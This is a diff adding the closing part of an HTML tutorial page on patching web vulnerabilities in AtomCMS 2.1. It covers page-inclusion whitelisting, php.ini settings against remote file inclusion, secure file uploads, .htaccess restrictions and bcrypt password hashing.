+        $allowedPages = array
+        (
+        'dashboard', 
+        'pages', 
+        'users', 
+        'navigation', 
+        'settings'
+        );
+        
+        $page = escape_html($_GET['page']);    
+        if(in_array($page, $allowedPages) 
+          && file_exists('views/'.$page.'.php'))
+        {
+          include ('views/'.$page.'.php');
+        }
+        else
+        {
+          echo 'File not found.';
+        }
+          </code>
+        </pre>
+    <h4>Patching Remote File Inclusion</h4>
+    <p>In order to patch this vulnerability, we must set the following options inside of the php.ini file: <code
+        class="text-primary">allow_url_fopen = Off</code> and <code class="text-primary">allow_url_include = Off</code>.
+    </p>
+    <hr />
+    <h3 class="title-padding" id="patch-file-upload">Patching File Upload Attacks</h3>
+    <p>In order for us to write a secure file upload functionality, we need to <u>correctly</u> check against the type, extension, size, encode the metadata using an image library, rename the file, move it to our
+    desired folder and delete the temporary file.</p>
+    <p>It is a good practice to have your "uploads" folder outside of your root web directory.</p>
+    <p>Also, you need to have <u><strong>PHP-GD</strong></u> library enabled in order for this script to work.</p>
+    <p><a target="_blank" href="https://github.com/v-dumitrescu/secure-file-upload">You can see an example of secure file upload functionality here.</a></p>
+    <p>However, there is a gotcha to keep in mind: some images will not have a .png or .jpeg extension in the name, which could trigger an error if we check the validity for the last dot followed by the extension. Also, <code class="bg-dark text-white p-1">$_FILES['image']['mime']</code> is not a reliable way of checking the mime because an image without an extension in the name can have a mime of application/octet-stream. For correctly checking the mime, we will use the <code class="bg-dark text-white p-1">finfo</code> php function which would return a mime of image/jpeg or image/png instead of application/octet-stream.</p>
+
+    <hr />
+
+    <h3 class="title-padding" id="patch-fpd">Patching Full Path Disclosure</h3>
+    <p>For patching this kind of vulnerability, we need to restrict the access to files and folders we don't want other users to see. Almost every folder from AtomCMS-2.1 contains an htaccess file which we can use for restricting the access to our server's folders and files.</p>
+    
+    <hr />
+    <h3 class="title-padding" id="patch-collision">Patching Collision Attacks</h3>
+    <p>We will use another hashing algorithm along with different php functions inside of AtomCMS 2.1:</p>
+    <p>
+    <pre>
+        <code>
+          $hashed_password = password_hash($password, PASSWORD_BCRYPT);
+      </code>
+    </pre>
+    </p>
+    <p>
+    <pre>
+        <code>
+          if(password_verify($password, $hash)) 
+          {
+            ...
+          }
+      </code>
+    </pre>
+    </p>
+
+    <h3 id="note">Note</h3>
+    <p>Frameworks exist for a good reason. They are object oriented, they follow an MVC pattern and they have some
+      security features out of the box. If you are doing something by yourself, for example, creating your custom CMS or
+      MVC framework, then you need to be careful about how you are handling data.</p>
+    <p>It's important to understand that even if your website is not vulnerable to any web application attacks, then
+      your server's software may have, for example, a <a target="_blank"
+        href="https://en.wikipedia.org/wiki/Buffer_overflow">buffer overflow</a> vulnerability or another type of server software
+      vulnerability which is sitting there, awaiting for someone to exploit it. Even if your website and server are not
+      vulnerable, then it takes <u>only one click</u> from someone who has been tricked in order to exploit his browser
+      or computer. Someone can download a malicious image or a malicious executable, open it and then getting his
+      computer hacked. If the victim is a hosting service employee, then your website or server can be compromised.</p>
+      <p>Security will never be perfect. However, this is not an excuse and I think every developer should learn about security.</p>
+      <h3>Useful Resources:</h3>
+      <p><a target="_blank" href="https://portswigger.net/web-security">Portswigger Web Security</a></p>
+      <p><a target="_blank" href="https://owasp.org/www-project-top-ten/">OWASP</a></p>
+
+      <h4>Icon used in the tab:</h4>
+      <a target="_blank" href="https://www.flaticon.com/free-icons/lock" title="lock icons">Lock icons created by Those Icons - Flaticon</a>
+ 
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
+    crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/shiki@0.9.10/dist/index.unpkg.iife.js"></script>
+  <script>
+    shiki
+      .getHighlighter({
+        theme: 'dark-plus'
+      })
+      .then(highlighter => {
+        document.querySelectorAll('pre').forEach(element => {
+          const language = element.dataset.lang || 'php';
+          const code = highlighter.codeToHtml(element.innerText, language);
+          element.innerHTML = code
+        });
+      });
+  </script>
+</body>
+
+</html>
